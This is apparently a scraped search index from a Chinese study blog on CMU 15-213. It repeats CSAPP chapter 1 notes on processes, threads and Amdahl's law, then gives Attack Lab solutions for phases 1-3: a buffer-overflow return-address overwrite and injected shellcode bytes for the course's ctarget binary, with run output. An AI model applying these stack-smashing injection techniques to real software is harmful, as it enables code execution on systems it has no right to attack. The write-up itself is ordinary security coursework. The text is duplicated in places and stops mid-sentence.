进程进程是操作系统对一个正在运行的程序的一种抽象，在这个系统中上可同时运行多个进程，而每个进程都好像在独自的使用硬件。并发运行时，是一个进程的指令与另一个进程的指令时间交错执行的。这是通过处理器在进程间切换实现的，该机制由操作系统实现，称之为上下文切换。上下文是指进程运行所需的所有状态信息，包括 PC、寄存器文件当前值、主存的内容。一般单处理器一次只能执行一个进程的代码，当它需要交错执行多个指令时，需要执行上下文切换，其步骤包括： 保存当前进程的上下文 恢复新进程的上下文 将控制权转移到新进程（系统调用） 新进程终止后，操作系统恢复旧进程上下文 控制权转移回旧进程（系统调用） 控制权的转移通过系统调用实现，它使得 CPU 的状态从用户态变为内核态。操作系统内核是系统管理全部进程所用代码和数据结构的集合。 在单核处理器中，一个 CPU 可以并发的执行多个进程。而在多核 CPU 中，多个处理器可以同时执行多个进程。 5.1.2 线程一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和数据区域，但是不一样的是他们拥有各自独立的栈空间。 ","date":"2024-02-29","objectID":"/ch1/:5:1","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#进程--线程"},{"categories":["系统入门"],"content":" 5.1 进程 \u0026 线程 5.1.1 进程进程是操作系统对一个正在运行的程序的一种抽象，在这个系统中上可同时运行多个进程，而每个进程都好像在独自的使用硬件。并发运行时，是一个进程的指令与另一个进程的指令时间交错执行的。这是通过处理器在进程间切换实现的，该机制由操作系统实现，称之为上下文切换。上下文是指进程运行所需的所有状态信息，包括 PC、寄存器文件当前值、主存的内容。一般单处理器一次只能执行一个进程的代码，当它需要交错执行多个指令时，需要执行上下文切换，其步骤包括： 保存当前进程的上下文 恢复新进程的上下文 将控制权转移到新进程（系统调用） 新进程终止后，操作系统恢复旧进程上下文 控制权转移回旧进程（系统调用） 控制权的转移通过系统调用实现，它使得 CPU 的状态从用户态变为内核态。操作系统内核是系统管理全部进程所用代码和数据结构的集合。 在单核处理器中，一个 CPU 可以并发的执行多个进程。而在多核 CPU 中，多个处理器可以同时执行多个进程。 5.1.2 线程一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和数据区域，但是不一样的是他们拥有各自独立的栈空间。 ","date":"2024-02-29","objectID":"/ch1/:5:1","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#进程"},{"categories":["系统入门"],"content":" 5.1 进程 \u0026 线程 5.1.1 进程进程是操作系统对一个正在运行的程序的一种抽象，在这个系统中上可同时运行多个进程，而每个进程都好像在独自的使用硬件。并发运行时，是一个进程的指令与另一个进程的指令时间交错执行的。这是通过处理器在进程间切换实现的，该机制由操作系统实现，称之为上下文切换。上下文是指进程运行所需的所有状态信息，包括 PC、寄存器文件当前值、主存的内容。一般单处理器一次只能执行一个进程的代码，当它需要交错执行多个指令时，需要执行上下文切换，其步骤包括： 保存当前进程的上下文 恢复新进程的上下文 将控制权转移到新进程（系统调用） 新进程终止后，操作系统恢复旧进程上下文 控制权转移回旧进程（系统调用） 控制权的转移通过系统调用实现，它使得 CPU 的状态从用户态变为内核态。操作系统内核是系统管理全部进程所用代码和数据结构的集合。 在单核处理器中，一个 CPU 可以并发的执行多个进程。而在多核 CPU 中，多个处理器可以同时执行多个进程。 5.1.2 线程一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和数据区域，但是不一样的是他们拥有各自独立的栈空间。 ","date":"2024-02-29","objectID":"/ch1/:5:1","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#线程"},{"categories":["系统入门"],"content":" 5.2 虚拟内存虚拟内存为每个进程提供了一种假象，就是她们都单独的占有主存，每个进程看到的内存都是一致的，我们将其称之为虚拟地址空间。虚拟地址空间从低字节到高字节可划分为以下几个段： 只读的程序代码和数据 可读写的程序数据 堆（malloc）分配 共享库内存映射区域 用户栈 内核虚拟内存（用户代码不可见） ","date":"2024-02-29","objectID":"/ch1/:5:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#虚拟内存"},{"categories":["系统入门"],"content":" 5.3 文件文件可以作为 I/O 设备的抽象，I/O 设备具有各种不同的特性，但是通过将其抽象为文件，我们可以通过一组统一的接口来访问他们。 ","date":"2024-02-29","objectID":"/ch1/:5:3","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#文件"},{"categories":["系统入门"],"content":" 6 网络通信网络也可以视为一个 I/O 设备，我们从文件中读写数据的方法很多都可以应用在网络设备的读写上。 ","date":"2024-02-29","objectID":"/ch1/:6:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#网络通信"},{"categories":["系统入门"],"content":" 7 重要主题 系统是软硬件的有机结合体！ ","date":"2024-02-29","objectID":"/ch1/:7:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#重要主题"},{"categories":["系统入门"],"content":" 7.1 Amdahl 定律当我们对系统的某个部分进行加速时，其对系统整体的性能的影响取决于该部分的重要性和加速程度。假设系统执行某应用程序所需时间为$T_{old}$，某部分执行时间与该时间的比例为$\\alpha$，而该部分性能提升比例为$k$。即该部分初始所需时间为$\\alphaT_{old}$,现在为$\\frac{\\alphaT_{old}}{k}$，那么总的执行时间应该为： $$ T_{new} = (1-\\alpha)T_{old}+\\frac{\\alpha*T_{old}}{k} $$ 加速比 S 为 $$ S = \\frac{T_{old}}{T_{new}} = \\frac{1}{(1-\\alpha)+\\frac{\\alpha}{k}} $$ 其结论为：要想显著加速整个系统，必须提升全系统中相当大的部分的速度。此外，当 k 趋近于$\\infin$时，最后的加速比等于$\\frac{1}{1-\\alpha}$ ","date":"2024-02-29","objectID":"/ch1/:7:1","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#amdahl-定律"},{"categories":["系统入门"],"content":" 7.2 并发和并行我们的优化体现在，希望： 计算机做的更多 计算机运行更快 7.2.1 线程级并发 使用进程：有多个程序执行 使用线程：一个进程中执行多个控制流 7.2.2 指令级并行处理器同时执行多条指令。 流水线：可以用来处理一条指令的不同部分，以此达到同时执行多条指令的目的 达到比一个周期一条指令更快的执行速率，称之为超标量 7.2.3 单指令、多数据并行许多处理器拥有特殊硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如浮点数加法指令。编译器有时会试图抓取 SIMD 并行性特征，也可以使用特殊向量数据类型编写程序。 ","date":"2024-02-29","objectID":"/ch1/:7:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#并发和并行"},{"categories":["系统入门"],"content":" 7.2 并发和并行我们的优化体现在，希望： 计算机做的更多 计算机运行更快 7.2.1 线程级并发 使用进程：有多个程序执行 使用线程：一个进程中执行多个控制流 7.2.2 指令级并行处理器同时执行多条指令。 流水线：可以用来处理一条指令的不同部分，以此达到同时执行多条指令的目的 达到比一个周期一条指令更快的执行速率，称之为超标量 7.2.3 单指令、多数据并行许多处理器拥有特殊硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如浮点数加法指令。编译器有时会试图抓取 SIMD 并行性特征，也可以使用特殊向量数据类型编写程序。 ","date":"2024-02-29","objectID":"/ch1/:7:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#线程级并发"},{"categories":["系统入门"],"content":" 7.2 并发和并行我们的优化体现在，希望： 计算机做的更多 计算机运行更快 7.2.1 线程级并发 使用进程：有多个程序执行 使用线程：一个进程中执行多个控制流 7.2.2 指令级并行处理器同时执行多条指令。 流水线：可以用来处理一条指令的不同部分，以此达到同时执行多条指令的目的 达到比一个周期一条指令更快的执行速率，称之为超标量 7.2.3 单指令、多数据并行许多处理器拥有特殊硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如浮点数加法指令。编译器有时会试图抓取 SIMD 并行性特征，也可以使用特殊向量数据类型编写程序。 ","date":"2024-02-29","objectID":"/ch1/:7:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#指令级并行"},{"categories":["系统入门"],"content":" 7.2 并发和并行我们的优化体现在，希望： 计算机做的更多 计算机运行更快 7.2.1 线程级并发 使用进程：有多个程序执行 使用线程：一个进程中执行多个控制流 7.2.2 指令级并行处理器同时执行多条指令。 流水线：可以用来处理一条指令的不同部分，以此达到同时执行多条指令的目的 达到比一个周期一条指令更快的执行速率，称之为超标量 7.2.3 单指令、多数据并行许多处理器拥有特殊硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如浮点数加法指令。编译器有时会试图抓取 SIMD 并行性特征，也可以使用特殊向量数据类型编写程序。 ","date":"2024-02-29","objectID":"/ch1/:7:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#单指令多数据并行"},{"categories":["系统入门"],"content":" 7.3 重点习题 Amdahl 定律计算 ","date":"2024-02-29","objectID":"/ch1/:7:3","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#重点习题"},{"categories":["系统入门"],"content":" 6 准备工作文件夹中的几个重要文件如下： cookie.txt: 8 个 16 进制数字的码，用于唯一标记 ctarget: 准备用于 code injection attack farm.c: 用于 return oriented programming attacks hex2raw: 用于生成攻击的二进制文件 README.txt: 介绍了文件夹中文件的内容 rtarget: 准备用于 return oriented programming attacks 实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。 ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:1:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#准备工作"},{"categories":["系统入门"],"content":" 7 Part I: Code Injection Attack","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-i-code-injection-attack"},{"categories":["系统入门"],"content":" 7.1 Phase 1：覆盖返回地址在这个 phase 中，我们需要引导 ctarget 中的test函数返回到touch1函数。首先我们对ctarget做反汇编。其中test函数的汇编代码如下： text 0000000000401968 \u003ctest\u003e: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 \u003cgetbuf\u003e 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 40198c: 48 83 c4 08 add $0x8,%rsp 401990: c3 retq 而touch1函数的地址是0x4017c0。 在这其中我们调用getbuf函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是0x401976，我们需要将其换成0x4017c0。我们现在对getbuf进行反汇编(nop 指令省去)： text 00000000004017a8 \u003cgetbuf\u003e: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 \u003cGets\u003e 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 对该过程进行分析： 留出 40 个字节的位置 rdi = rsp 调用 gets 函数 eax = 1 恢复栈空间 返回 要完成这个实验，我们需要直到几个值： buf 的位置: 应该进入getbuf后，%rsp - 40之后的位置 返回地址在栈中位置: 在调用callq函数时，我们会将%rsp - 8，然后将返回地址压入，然后将%rip设置为getbuf函数的地址。（同理，调用retq的时候，我们会把栈顶的地址赋给%rip，然后让%rsp + 8，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完callq之后%rsp的位置。 touch1函数的地址:0x4017c0 这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a,那个是换行符）。因为是小端法，最后 8 个字节应该是0xc0 0x17 0x40。 该阶段输入内容存储在phase1.txt中，内容如下：00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40。输入命令./hex2raw \u003c phase1.txt | ./ctarget -q进行测试(-q是指运行在本地电脑上)，结果如下： bash Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 成功！ ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:1","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase-1覆盖返回地址"},{"categories":["系统入门"],"content":" 7.2 Phase 2：在 buf 中插入攻击代码并覆盖返回地址在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让test函数返回到touch2，而且我们需要让val的值等于cookie的值。（而且这里我们不能直接让test返回到打印Touch2!那一句，因为前面有vlevel = 2，后面需要验证这个值是不是 2，如果直接跳到那一句的话，vlevel没有赋值，也肯定不等于 2，验证就会失败）。 touch2的函数源码如下： c void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); } else { printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); } exit(0); } touch2的汇编函数如下： text 00000000004017ec \u003ctouch2\u003e: seg1: 4017ec: 48 83 ec 08 sub $0x8,%rsp 4017f0: 89 fa mov %edi,%edx 4017f2: c7 05 e0 2c 20 00 02 movl $0x2,0x202ce0(%rip) # 6044dc \u003cvlevel\u003e 4017f9: 00 00 00 4017fc: 3b 3d e2 2c 20 00 cmp 0x202ce2(%rip),%edi # 6044e4 \u003ccookie\u003e 401802: 75 20 jne 401824 \u003ctouch2+0x38\u003e 401804: be e8 30 40 00 mov $0x4030e8,%esi 401809: bf 01 00 00 00 mov $0x1,%edi 40180e: b8 00 00 00 00 mov $0x0,%eax 401813: e8 d8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401818: bf 02 00 00 00 mov $0x2,%edi 40181d: e8 6b 04 00 00 callq 401c8d \u003cvalidate\u003e 401822: eb 1e jmp 401842 \u003ctouch2+0x56\u003e seg2: 401824: be 10 31 40 00 mov $0x403110,%esi 401829: bf 01 00 00 00 mov $0x1,%edi 40182e: b8 00 00 00 00 mov $0x0,%eax 401833: e8 b8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401838: bf 02 00 00 00 mov $0x2,%edi 40183d: e8 0d 05 00 00 callq 401d4f \u003cfail\u003e seg3: 401842: bf 00 00 00 00 mov $0x0,%edi 401847: e8 f4 f5 ff ff callq 400e40 \u003cexit@plt\u003e 从上述汇编代码可以看出，val的值在最开始存在edi处。那么我们的目的就是让这个值等于cookie。而且cookie的位置是6044e4。所以我们的目的是让%edi寄存器的值等于6044e4处的值。 要实现攻击，我们的 buffer overflow 必须完成四步动作： 让 return address 等于 buf 的开头 在 buf 开头插入赋值语句，让%edi = *0x6044e4 让 return address = touch2 的入口地址(0x4017ec) 调用ret 首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后%rsp在哪里。 我们着重观察 3 个地方的$rsp： 调用getbuf之前: 0x5561dca8 调用getbuf之后: 0x5561dca0 调用rsp = rsp - 40之后: 0x5561dc78 那么我们可以判断 buf 的起始位置是0x5561dc78，返回地址的位置在其后 40 个字节处，也就是0x5561dca0。那么我们需要让 return address(buf 最后 8 个字节)的值等于0x5561dc78。换成小端序就是0x78 0xdc 0x61 0x55。 第二条要生成的指令应该是: text movl $0x6044e4,%eax movl (%eax),%edi 第三条要生成的指令应该是： text subq $0x8,%rsp movl 0x4017ec,($rsp) 最后一条插入的指令是ret，在这个过程中，%rsp处的内容会被赋值给%rip，%rsp会自动加上 8。 最后插入数条nop指令实现 PC 的顺序累加。 由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中： text movl $0x6044e4,%eax movl (%eax),%edi subq $0x8,%rsp movl $0x4017ec,(%rsp) ret nop nop nop nop 然后使用gcc -c ph2.s生成ph2.o文件，然后使用objdump -d ph2.o \u003e ph2.d，打开ph2.d，有如下内容： text ph2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: b8 e4 44 60 00 mov $0x6044e4,%eax 5: 67 8b 38 mov (%eax),%edi 8: 48 83 ec 08 sub $0x8,%rsp c: c7 04 24 ec 17 40 00 movl $0x4017ec,(%rsp) 13: c3 retq 14: 90 nop 15: 90 nop 16: 90 nop 17: 90 nop 那么我们所需要的字节就是b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3，共 20 字节。后续再插入 20 个字节的nop(0x90) 完整的字符串是b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55，我将其保存在phase2.txt中。 注：一开始把0x5561dc78打成了0x5564dc78导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。 此外，注入代码的时候需要手动添加ret指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。 结果如下： bash Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:B8 E4 44 60 00 67 8B 38 48 83 EC 08 C7 04 24 EC 17 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 成功！ ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:2","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase-2在-buf-中插入攻击代码并覆盖返回地址"},{"categories":["系统入门"],"content":" 7.3 Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址在 phase 3 中，我们需要让程序在getbuf后，运行touch3函数，其注入方式和 phase 2 类似。（此处需要利用vlevel = 3进行跳转后验证，因此和上次一样，我们不能直接跳转到Touch3!语句，还是需要注入代码，将%rdi设置为cookie的值，然后再引导程序跳转到touch3的开头语句）。touch3函数的 C 语言版本如下： c /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\"%s\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\"%s\")\\n\", sval); fail(3); } exit(0); } 7.3.1 一开始的错误解答这里的差别在于我们输入的string是一个cookie的字符串表示。我们对touch3做反汇编看看cookie的字符串表示存在哪里？ text 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 \u003ccookie\u003e 我们输入x/s 0x6044e4看看结果： text (gdb) x/s 0x6044e4 0x6044e4 \u003ccookie\u003e: \"\" 这里同样，可以看出来和上一次的cookie放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值%rdi设置为0x6044e4位置的值。而这次%rdi指向输入的字符串，我们需要做的是将%rdi设置为0x6044e4。 此外，touch3的入口地址为0x4018fa。因此在最后需要让 return address 等于这个值。 那么总体的注入和上次遵循一样的步骤： 让 return address 等于 buf 的开头(0x5561dc78) 在 buf 开头插入赋值语句，让%edi = 0x6044e4 让 return address = touch3 的入口地址(0x4018fa) 调用ret 综上，这次的调用语句是： text movl $0x6044e4,%edi subq $0x8,%rsp movl $0x4018fa,(%rsp) ret nop nop nop nop 将其保存在ph3.s中，输入gcc -c ph3.s生成ph3.o文件，再objdump -d ph3.o \u003e ph3.d，生成ph3.d文件。 文件内容如下： text ph3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: bf e4 44 60 00 mov $0x6044e4,%edi 5: 48 83 ec 08 sub $0x8,%rsp 9: c7 04 24 fa 18 40 00 movl $0x4018fa,(%rsp) 10: c3 retq 11: 90 nop 12: 90 nop 13: 90 nop 14: 90 nop 那么其一直到ret的字节即为bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3。一共 17 个字节。将其字节复制到phase3.txt的最前面。添加 23 个nop(0x90)凑齐 40 个字节，最后 8 个字节的值必须等于0x5561dc78。换成小端序就是0x78 0xdc 0x61 0x55。 完整字符串如下： text bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 输入./hex2raw \u003c phase3.txt | ./ctarget 。结果如下： bash Cookie: 0x59b997fa Type string:Misfire: You called touch3(\"���Y\") FAIL: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 最后确实跳转到了touch3，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽) 7.3.2 忽略随机栈空间的不正确解答我们最早是认为，应该让%edi指向0x6044e4，也就是cookie字符串所在的位置，来让%edi和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，cookie不是个字符串，还是个unsigned类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让输入的字符串和打印出来的 cookie 的值相同。所以这里不能让%rdi指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给%rdi，然后让%rdi和cookie的打印版进行比较。 那么cookie的值是多少？我们使用p /x cookie命令打印一下： text (gdb) p /x cookie $4 = 0x59b997fa 所以输入的字符串应该是0x59b997fa。 经过阅读 attacklab.pdf，作者给出了以下几个提示： 攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x） 字符串最后应该有个 0，输入man ascii在 Linux 中查找 ascii 表 攻击代码应该让%rdi的值等于这个字符串的起始地址 hexmatch和strncmp可能会覆盖一部分getbuf中的 buf，注意不要让你的攻击字符串被覆盖掉。 那么初始的准备工作应该是： 确定插入字符串和攻击代码的有效区域，防止被hexmatch和strncmp影响到 查找cookie字符串的编码，加上一个\\0，并插入到攻击代码之前 确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节 在攻击代码中所做的工作应该是： 让%rdi = 插入字符串的起始位置 将touch3的起始位置插入到返回地址处 调用ret返回 通过多个nop填充字符串（也可以不填充？） 我们首先确定getbuf的buf范围，hexmatch的辐射范围和strncmp的辐射范围。 通过前文我们分析过： 调用getbuf之前: 0x5561dca8 调用getbuf之后: 0x5561dca0 调用rsp = rsp - 40之后: 0x5561dc78 可以了解到buf的范围是：0x5561dc78 ~ 0x5561dc9f，buf后 8 个字节的返回地址的位置是0x5561dca0。 对touch3进行反汇编可得： text Dump of assembler code for function touch3: 0x00000000004018fa \u003c+0\u003e: push %rbx 0x00000000004018fb \u003c+1\u003e: mov %rdi,%rbx 0x00000000004018fe \u003c+4\u003e: movl $0x3,0x202bd4(%rip) # 0x6044dc \u003cvlevel\u003e 0x0000000000401908 \u003c+14\u003e: mov %rdi,%rsi 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 \u003ccookie\u003e 0x0000000000401911 \u003c+23\u003e: callq 0x40184c \u003chexmatch\u003e 0x0000000000401916 \u003c+28\u003e: test %eax,%eax 0x0000000000401918 \u003c+30\u003e: je 0x40193d \u003ctouch3+67\u003e 0x000000000040191a \u003c+32\u003e: mov %rbx,%rdx 0x000000000040191d \u003c+3","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:3","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase-3在-buf-中插入所需字符串和攻击代码并覆盖返回地址"},{"categories":["系统入门"],"content":" 7.3 Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址在 phase 3 中，我们需要让程序在getbuf后，运行touch3函数，其注入方式和 phase 2 类似。（此处需要利用vlevel = 3进行跳转后验证，因此和上次一样，我们不能直接跳转到Touch3!语句，还是需要注入代码，将%rdi设置为cookie的值，然后再引导程序跳转到touch3的开头语句）。touch3函数的 C 语言版本如下： c /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\"%s\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\"%s\")\\n\", sval); fail(3); } exit(0); } 7.3.1 一开始的错误解答这里的差别在于我们输入的string是一个cookie的字符串表示。我们对touch3做反汇编看看cookie的字符串表示存在哪里？ text 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 我们输入x/s 0x6044e4看看结果： text (gdb) x/s 0x6044e4 0x6044e4 : \"\" 这里同样，可以看出来和上一次的cookie放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值%rdi设置为0x6044e4位置的值。而这次%rdi指向输入的字符串，我们需要做的是将%rdi设置为0x6044e4。 此外，touch3的入口地址为0x4018fa。因此在最后需要让 return address 等于这个值。 那么总体的注入和上次遵循一样的步骤： 让 return address 等于 buf 的开头(0x5561dc78) 在 buf 开头插入赋值语句，让%edi = 0x6044e4 让 return address = touch3 的入口地址(0x4018fa) 调用ret 综上，这次的调用语句是： text movl $0x6044e4,%edi subq $0x8,%rsp movl $0x4018fa,(%rsp) ret nop nop nop nop 将其保存在ph3.s中，输入gcc -c ph3.s生成ph3.o文件，再objdump -d ph3.o \u003e ph3.d，生成ph3.d文件。 文件内容如下： text ph3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: bf e4 44 60 00 mov $0x6044e4,%edi 5: 48 83 ec 08 sub $0x8,%rsp 9: c7 04 24 fa 18 40 00 movl $0x4018fa,(%rsp) 10: c3 retq 11: 90 nop 12: 90 nop 13: 90 nop 14: 90 nop 那么其一直到ret的字节即为bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3。一共 17 个字节。将其字节复制到phase3.txt的最前面。添加 23 个nop(0x90)凑齐 40 个字节，最后 8 个字节的值必须等于0x5561dc78。换成小端序就是0x78 0xdc 0x61 0x55。 完整字符串如下： text bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 输入./hex2raw \u003c phase3.txt | ./ctarget 。结果如下： bash Cookie: 0x59b997fa Type string:Misfire: You called touch3(\"���Y\") FAIL: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 最后确实跳转到了touch3，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽) 7.3.2 忽略随机栈空间的不正确解答我们最早是认为，应该让%edi指向0x6044e4，也就是cookie字符串所在的位置，来让%edi和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，cookie不是个字符串，还是个unsigned类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让输入的字符串和打印出来的 cookie 的值相同。所以这里不能让%rdi指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给%rdi，然后让%rdi和cookie的打印版进行比较。 那么cookie的值是多少？我们使用p /x cookie命令打印一下： text (gdb) p /x cookie $4 = 0x59b997fa 所以输入的字符串应该是0x59b997fa。 经过阅读 attacklab.pdf，作者给出了以下几个提示： 攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x） 字符串最后应该有个 0，输入man ascii在 Linux 中查找 ascii 表 